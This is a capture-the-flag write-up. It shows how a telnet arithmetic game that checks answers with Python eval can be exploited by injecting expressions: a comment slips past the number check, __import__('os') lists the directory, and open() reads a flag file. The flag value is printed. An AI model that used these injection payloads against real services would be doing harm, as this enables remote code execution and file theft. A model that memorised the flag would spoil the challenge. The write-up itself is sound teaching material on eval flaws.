# Twenty-four

> You can do primary school math, right?

## Write-up

`twenty-four` was a telnet challenge. The source code of this challenge is [here](twenty-four.py) for whoever is interested, but you don't need it to solve the challenge. Paying close attention to the errors should suffice. If you connected, you would be greeted with the following message (the task would be different):

```
In this game, you need to combine four numbers using standard mathematical operators ("+", "-", "*", "/", "**") to get 24 as a result.

Example question: [1 1 5 5]
Example solution: -1 + 1 * 5 * 5
Task: [1, 2, 4, 11]
```

Your first instinct would probably be to solve it, but since the challenge type was *exploit*, this was of course not what you were supposed to do. For those who did write a solver: congratulations, you could play an infinitely long game against the computer, since the game was running in a `while True:` loop ;-)

So, what would happen if we'd insert invalid solutions? Let's try:

```
Enter solution: 1+2+4+11
Wrong :( Try again.
Task: [1, 2, 4, 11]
Enter solution: foo
You didn't use all numbers!
Task: [1, 2, 4, 11]
Enter solution: 1 + 2 + 4 + 11 + foo
Traceback (most recent call last):
  File "twenty-four.py", line 43, in <module>
    elif eval(sol) == 24:
  File "<string>", line 1, in <module>
NameError: name 'foo' is not defined
```

This is interesting! We got a `NameError` in Python, which means that "[a local or global name is not found](https://docs.python.org/3/library/exceptions.html#NameError)". It appears that `foo` is interpreted as a Python variable!

If we look at the nice stack trace we also got, we could see why this happens: the game checks if your solution is correct by evaluating it with `eval`! For those who don't know `eval`: it is a red flag indicating remote code execution. [Check the documentation](https://docs.python.org/3.6/library/functions.html#eval) for more information.

So now that we know we can insert code, wat can we do with it? Let's start again and try to find out what's in our current working directory:

```
Task: [2, 11, 11, 11]
Enter solution: os.listdir()
You didn't use all numbers!
Task: [2, 11, 11, 11]
Enter solution: os.listdir() # 2 11 
Traceback (most recent call last):
  File "twenty-four.py", line 43, in <module>
    elif eval(sol) == 24:
  File "<string>", line 1, in <module>
NameError: name 'os' is not defined
```

We couldn't just call `os.listdir()`, because the game checks that you've used all your numbers. Luckily, this is really easy to bypass, by adding a comment with the necessary numbers at the end. We didn't even need to list the 11 three times, so the checking must be really sloppy! Can we import `os`?

```
Task: [9, 10, 11, 13]
Enter solution: import os; os.listdir() # 9 10 11 13
Traceback (most recent call last):
  File "twenty-four.py", line 43, in <module>
    elif eval(sol) == 24:
  File "<string>", line 1
    import os; os.listdir() # 9 10 11 13
         ^
SyntaxError: invalid syntax
```

That's strange. [This helpful StackOverflow answer](https://stackoverflow.com/a/17136796) tells us that `eval` only works for expressions, but `import` is a statement. That's a pity! Now what? The same StackOverflow answer also tells us:

> In Python 2.6 and earlier use `__import__`

It turns out that this method still works in Python 3 (which is used for this challenge), so we can write the following:

```
Task: [4, 9, 10, 12]
Enter solution: __import__('os').listdir() # 4 9 10 12
Wrong :( Try again.
Task: [4, 9, 10, 12]
Enter solution: print(__import__('os').listdir()) # 4 9 10 12
['flag', 'solvable-combinations.txt', 'twenty-four.py']
Wrong :( Try again.
```

Of course, `listdir()` only returns a string (it is an expression after all), so we must print it. This worked! We can now see all files in the current directory! And guess what: there's a file called `flag`. Nice! Can we get the contents?

```
Task: [4, 5, 7, 10]
Enter solution: print(open('flag', 'r').readlines()) # 4 5 7 10   
['FLG{29ZWhpVeETuswAM7QaJpnqqmFdcLMPLTYMTe93eDvTWN}\n']
Wrong :( Try again.
```

Turns out the file only contains one line, and it is the flag. Mission accomplished!
